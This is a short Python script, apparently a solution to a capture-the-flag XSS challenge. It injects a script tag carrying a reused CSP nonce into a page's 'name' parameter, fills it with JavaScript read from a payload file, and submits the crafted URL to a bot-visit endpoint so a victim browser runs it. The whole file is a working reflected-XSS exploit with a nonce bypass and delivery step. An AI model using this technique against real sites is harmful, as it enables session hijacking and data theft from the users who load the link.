#!/usr/bin/env python3

import urllib.parse
import requests

url = "http://35.224.135.84:3200"
report_url = "http://35.224.135.84:3201"

nonce = "70861e83ad7f1863b3020799df93e450"

js = open("payload.js").read()
# js = open("payload2.js").read()

s = """leo</h1>
<script nonce="{}">
{}
</script>
""".format(
    nonce, js
)

p = urllib.parse.quote(s, safe="")
u = f"{url}/?name={p}"
print(u)

my_json = {
    "url": u
}

r = requests.post(f"{report_url}/visit", json=my_json)
print(r.text)